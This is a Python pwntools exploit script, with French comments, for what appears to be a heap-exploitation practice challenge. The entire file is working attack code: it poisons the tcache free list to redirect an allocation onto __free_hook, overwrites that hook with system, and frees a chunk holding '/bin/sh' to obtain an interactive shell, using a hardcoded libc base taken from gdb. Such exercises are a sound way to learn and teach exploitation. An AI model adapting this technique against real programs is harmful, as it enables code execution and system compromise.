#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall_patched')
libc = ELF('libc.so.6')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def create(index):
    io.sendlineafter(b'Modifier un block\n', b'0')
    io.sendlineafter(b'Index:', str(index).encode())

def delete(index):
    io.sendlineafter(b'Modifier un block\n', b'1')
    io.sendlineafter(b'Index: ', str(index).encode())

def display(index):
    io.sendlineafter(b'Modifier un block\n', b'2')
    io.sendlineafter(b'Index: ', str(index).encode())

def modify(index, data):
    io.sendlineafter(b'Modifier un block\n', b'3')
    io.sendlineafter(b'Index: ', str(index).encode())
    io.sendafter(b'Data:', data)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

## pour récupérer cette adresse (adresse de base de la libc):
# gdb challenge_patched
# (gdb) start
# (gdb) info proc mappings
# ...
# 0x7ffff7dd5000     0x7ffff7df7000    0x22000        0x0  r--p   /home/paul/Downloads/Heap_exercices/challenge/libc.so.6
# ...
##
libc.address = 0x00007ffff7dd5000
create(0) # chunk0
create(1) # chunk1

delete(1)
delete(0)

# tcache: chunk0 -> chunk1

modify(0, p64(libc.sym['__free_hook']))

# tcache: chunk0 -> __free_hook

create(1)
create(0)

# si on écrit dans 0, on écrit dans __free_hook

modify(0, p64(libc.sym['system']))

# la fonction system sera appelée au prochain free

modify(1,b'/bin/sh')
delete(1)

# enjoy your shell

io.interactive()

